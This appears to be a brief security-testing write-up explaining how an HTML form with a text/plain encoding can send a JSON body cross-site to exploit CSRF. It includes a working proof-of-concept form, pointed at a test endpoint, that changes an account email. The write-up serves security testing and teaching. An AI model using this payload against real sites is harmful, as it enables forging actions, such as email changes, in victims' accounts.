## Vanilla HTML JSON Form

This article presents a straightforward Proof of Concept (POC) for making CORS-compliant POST requests with JSON data. No Javascript involved!

### Background
While testing for Cross-Site Request Forgery (CSRF) vulnerabilities, I discovered several endpoints that only accepted JSON data in POST requests. I aimed to devise a simple method to submit data from a client/browser to these endpoints, thereby potentially exploiting CSRF. This task proved challenging because there is no native way to send CORS JSON data via POST to another site (perhaps for security reasons).

### Proof of Concept

The POC leverages the fact that the `enctype` attribute can be set to `text/plain`, which circumvents sanitization of keys or values.

#### Example

Suppose we want to send the following JSON data to an endpoint (for demonstration, we use https://httpbin.smp.io/post):
```json
{"action": "edit", "email": "newemail@test.com"}
```

To construct a form for this data, we split it into two parts: a key and a value. The key will consistently look like this:
```json
{"dummy":"
```
The value will be:
```json
","action": "edit", "email": "newemail@test.com"}
```

When the form submits these parts, they combine in the request as:
```json
{"dummy":"=","action": "edit", "email": "newemail@test.com"}
```
This forms a valid JSON structure that the server can parse. By escaping the `"` character to `&quot;`, we create a POC form as follows:

```html
<form name="exploit" enctype="text/plain" action="https://httpbin.smp.io/post" method="post">
    <input type="hidden" name="{&quot;dummy&quot;:&quot;" value="&quot;,&quot;action&quot;:&quot;edit&quot;,&quot;email&quot;:&quot;newemail@test.com&quot;}">
    <button>Submit</button>
</form>
```

This technique allows you to explore and interact with various POST REST APIs from the client side.

### Limitations

This approach introduces an additional key-value pair in the JSON data (`"dummy":"="`), which may be detected by some structural validation checks. Furthermore, the client sends the data with the Content-Type `text/plain`, which some servers may reject.

### Conclusion

If you found this article helpful, consider giving a star or follow on GitHub.

- cli-ish
